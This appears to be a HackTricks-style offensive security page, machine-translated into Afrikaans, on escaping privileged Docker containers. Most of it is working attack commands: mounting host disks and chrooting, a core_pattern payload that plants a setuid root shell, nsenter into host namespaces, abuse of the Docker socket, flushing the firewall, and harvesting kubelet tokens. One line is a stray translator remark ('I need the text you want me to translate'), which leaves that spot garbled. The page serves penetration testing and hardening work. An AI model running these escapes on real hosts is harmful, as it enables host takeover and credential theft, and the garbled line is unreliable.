# Ontsnap uit `--privileged` Containers

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

'n Kontener wat met `--privileged` begin is nie dieselfde as 'n normale kontener met een of twee ekstra permissies nie. In praktyk verwyder of verswak `--privileged` verskeie van die standaard runtime-beskermings wat gewoonlik die werkbelasting van gevaarlike hostbronne weghou. Die presiese effek hang steeds af van die runtime en host, maar vir Docker is die algemene resultaat:

- alle capabilities word toegekend
- die device cgroup-beperkings word opgehef
- baie kernel filesystems hou op om read-only gemount te wees
- standaard gemaskerde procfs-paaie verdwyn
- seccomp filtering is uitgeschakel
- AppArmor-beperking is uitgeschakel
- SELinux-isolasie is uitgeschakel of vervang met ’n baie breër etiket

Die belangrike gevolg is dat ’n privileged container gewoonlik nie ’n subtiele kernel exploit benodig nie. In baie gevalle kan dit eenvoudig direk met host-toestelle, host-gefokusde kernel filesystems, of runtime-koppelvlakke interaksie hê en dan na ’n host-shell pivot.

## Wat `--privileged` Nie Outomaties Verander Nie

`--privileged` sluit **nie** outomaties by die host PID-, network-, IPC- of UTS-namespaces aan nie. ’n privileged container kan steeds private namespaces hê. Dit beteken sommige ontsnappingskettings vereis ’n ekstra voorwaarde soos:

- a host bind mount
- host PID sharing
- host networking
- visible host devices
- writable proc/sys interfaces

Daardie voorwaardes is dikwels maklik om in werklike misconfigurasies te bevredig, maar hulle is konsepteel apart van `--privileged` self.

## Ontsnappingspaaie

### 1. Mount The Host Disk Through Exposed Devices

’N privileged container sien gewoonlik baie meer device nodes onder `/dev`. As die host block device sigbaar is, is die eenvoudigste ontsnapping om dit te mount en met `chroot` in die host filesystem te gaan:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
As die root partition nie duidelik is nie, enumereer eers die blokuitleg:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
As die praktiese pad is om 'n setuid helper in 'n skryfbare host mount te plant in plaas daarvan om te `chroot`, onthou dat nie elke lêerstelsel die setuid bit eer nie. 'n Vinnige host-kant vermoënskontrole is:
```bash
mount | grep -v "nosuid"
```
Dit is nuttig omdat skryfbare paaie onder `nosuid` lêerstelsels baie minder interessant is vir die klassieke "drop a setuid shell and execute it later" werkvloeie.

Die verswakte beskermings wat hier misbruik word, is:

- volledige toestelblootstelling
- breë bevoegdhede, veral `CAP_SYS_ADMIN`

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Monteren of hergebruik van host bind mount en `chroot`

As die host root-lêerstelsel reeds binne die kontainer gemonteer is, of as die kontainer die nodige mounts kan skep omdat dit privileged is, is 'n host shell dikwels net een `chroot` ver:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
As daar geen host root bind mount bestaan nie, maar host storage bereikbaar is, skep een:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
This path abuses:

- verswakte mount-beperkings
- volle capabilities
- gebrek aan MAC-confinement

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Misbruik skryfbare `/proc/sys` Of `/sys`

Een van die groot gevolge van `--privileged` is dat procfs- en sysfs-beskermings baie swakker word. Dit kan host-facing kernel-interfaces blootstel wat normaalweg gemasker is of as read-only gemount is.

'n Klassieke voorbeeld is `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Ander hoë-waarde-paaie sluit in:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Hierdie pad misbruik:

- ontbrekende gemaskeerde paaie
- ontbrekende slegs-lees stelselpaaie

Related pages:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Gebruik volle capabilities vir mount- of namespace-gebaseerde ontsnapping

'n Geprivilegieerde container kry die capabilities wat normaalweg van standaardcontainers verwyder word, insluitend `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, en baie ander. Dit is dikwels genoeg om 'n plaaslike voet aan die grond in 'n host-ontsnapping te verander sodra 'n ander blootgestelde oppervlak bestaan.

'n Eenvoudige voorbeeld is om bykomende lêerstelsels te mount en namespace-toegang te gebruik:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
As host PID ook gedeel word, word die stap selfs korter:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Hierdie pad misbruik:

- die standaard privileged capability-stel
- opsionele host PID-deling

Verwante bladsye:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Ontsnap via runtime-sokette

’n privileged container eindig dikwels met host runtime-state of sockets sigbaar. As ’n Docker-, containerd- of CRI-O-socket bereikbaar is, is die eenvoudigste benadering dikwels om die runtime API te gebruik om ’n tweede container met host-toegang te begin:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Ek het die teks nodig wat jy wil hê ek moet vertaal. Plak asseblief die gedeelte van die lêer wat begin met "For containerd:".
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Hierdie pad misbruik:

- privileged runtime exposure
- host bind mounts wat deur die runtime self geskep is

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Verwyder newe-effekte van netwerkisolering

`--privileged` sluit nie op sigself by die host network namespace aan nie, maar as die container ook `--network=host` of ander toegang tot die host-netwerk het, word die volledige netwerkstapel veranderbaar:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Dit is nie altyd 'n direkte host-shell nie, maar dit kan lei tot denial of service, traffic interception, of toegang tot loopback-only management services.

Verwante bladsye:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Lees gasheer-sekrete en uitvoeringstoestand

Selfs wanneer 'n skoon shell-ontsnapping nie onmiddellik beskikbaar is nie, het geprivilegieerde containers dikwels genoeg toegang om gasheer-sekrete, kubelet-staat, runtime-metadata en naburige container-lêerstelsels te lees:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
As `/var` op die host gemount is of die runtime directories sigbaar is, kan dit genoeg wees vir lateral movement of cloud/Kubernetes credential theft selfs voordat 'n host shell verkry is.

Verwante bladsye:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Checks

Die doel van die volgende opdragte is om te bevestig watter privileged-container escape families onmiddellik lewensvatbaar is.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Wat hier interessant is:

- ’n volledige capability-stel, veral `CAP_SYS_ADMIN`
- skryfbare proc/sys-blootstelling
- sigbare host devices
- ontbrekende seccomp- en MAC-beperking
- runtime sockets of host root bind mounts

Enigeen van hierdie kan genoeg wees vir post-exploitation. Meerdere tesame beteken gewoonlik dat die container funksioneel een of twee opdragte van ’n host-kompromittering af is.

## Related Pages

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
